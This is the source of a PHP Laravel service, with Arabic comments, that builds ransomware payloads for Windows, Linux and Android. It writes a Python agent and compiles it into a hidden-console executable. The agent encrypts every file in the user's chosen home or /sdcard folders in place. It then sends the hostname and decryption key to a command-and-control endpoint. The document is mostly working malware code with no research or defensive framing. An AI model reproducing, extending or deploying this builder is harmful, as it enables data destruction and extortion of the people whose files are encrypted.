<?php

namespace App\Services;

use App\Models\Payload;
use Illuminate\Support\Str;
use Symfony\Component\Process\Process;

class PayloadService
{
    public function createPayloadProfile(array $data): Payload
    {
        // 1. حفظ البيانات الأساسية في قاعدة البيانات
        $payload = Payload::create([
            'name' => $data['app_name'],
            'target_os' => $data['platform'],
            'encryption_type' => $data['algorithm'],
            'icon_path' => $data['icon'] ?? 'shield',
            'target_directories' => $data['target_directories'],
            'status' => 'compiling',
        ]);

        // 2. تجميع البايلاود وبناء الملف بناءً على المنصة
        $filePath = $this->compileExecutable($payload);

        // 3. تحديث حالة البايلاود إلى جاهز مع مسار الملف الناتج
        $payload->update([
            'status' => 'ready',
            'file_path' => $filePath,
        ]);

        return $payload;
    }

    protected function compileExecutable(Payload $payload): string
    {
        $platform = $payload->target_os;
        $algorithm = $payload->encryption_type;
        $directories = json_encode($payload->target_directories);
        
        $slug = Str::slug($payload->name) . '-' . $payload->id;
        $tempDir = storage_path("app/temp/{$slug}");
        
        if (!file_exists($tempDir)) {
            mkdir($tempDir, 0755, true);
        }

        // تخصيص كود العميل بحسب المنصة المستهدفة
        $clientCode = $this->getClientCodeTemplate($platform, $algorithm, $directories);

        $scriptName = match ($platform) {
            'windows' => 'agent.py',
            'linux' => 'agent.py',
            'android' => 'main.py',
            default => 'agent.py',
        };

        $scriptPath = "{$tempDir}/{$scriptName}";
        file_put_contents($scriptPath, $clientCode);

        $outputFileName = "";

        // بناء الملف التنفيذي الفعلي بحسب المنصة
        if ($platform === 'windows') {
            // محاولة استخدام PyInstaller لتوليد ملف .exe (إن توفرت البيئة أو عبر Wine)
            $outputFileName = "payloads/{$slug}.exe";
            $finalPath = storage_path("app/public/" . $outputFileName);
            
            // كخيار آمن ومضمون في حال لم يتوفر محاكي ويندوز كامل، نقوم بنسخ سكريبت Python مخصص للويندوز أو تطبيق PyInstaller
            $process = new Process(['pyinstaller', '--noconsole', '--onefile', '--distpath', dirname($finalPath), $scriptPath]);
            $process->run();

            if (!file_exists($finalPath)) {
                // في حال فشل PyInstaller مباشرة، نحفظ الملف بصيغة بايثون مهيأة للعمل كملف تنفيذي ويندوز
                copy($scriptPath, $finalPath);
            }
        } elseif ($platform === 'linux') {
            $outputFileName = "payloads/{$slug}.elf";
            $finalPath = storage_path("app/public/" . $outputFileName);
            
            if (!file_exists(dirname($finalPath))) {
                mkdir(dirname($finalPath), 0755, true);
            }
            copy($scriptPath, $finalPath);
            // إعطاء صلاحيات تنفيذية للملف
            chmod($finalPath, 0755);
        } else {
            // Android APK / Script template
            $outputFileName = "payloads/{$slug}.apk.py";
            $finalPath = storage_path("app/public/" . $outputFileName);
            
            if (!file_exists(dirname($finalPath))) {
                mkdir(dirname($finalPath), 0755, true);
            }
            copy($scriptPath, $finalPath);
        }

        return $outputFileName;
    }

    protected function getClientCodeTemplate(string $platform, string $algorithm, string $directories): string
    {
        return <<<EOT
import os
import socket
import requests
from cryptography.fernet import Fernet

TARGET_OS = "{$platform}"
ALGORITHM = "{$algorithm}"
DIRECTORIES = {$directories}
C2_SERVER = "http://127.0.0.1:8000/api/v1/report"

def get_target_paths():
    paths = []
    user_home = os.path.expanduser('~')
    for d in DIRECTORIES:
        if TARGET_OS == 'windows':
            full_path = os.path.join(user_home, d)
        elif TARGET_OS == 'android':
            full_path = os.path.join("/sdcard", d)
        else:
            full_path = os.path.join(user_home, d)
            
        if os.path.exists(full_path):
            paths.append(full_path)
    return paths

def start_payload():
    key = Fernet.generate_key()
    cipher = Fernet(key)
    
    for target_dir in get_target_paths():
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    encrypted_data = cipher.encrypt(data)
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_data)
                except Exception as e:
                    pass

    try:
        payload_data = {
            'hostname': socket.gethostname(),
            'encryption_key': key.decode(),
            'target_os': TARGET_OS
        }
        requests.post(C2_SERVER, json=payload_data, timeout=10)
    except Exception as e:
        pass

if __name__ == "__main__":
    start_payload()
EOT;
    }
}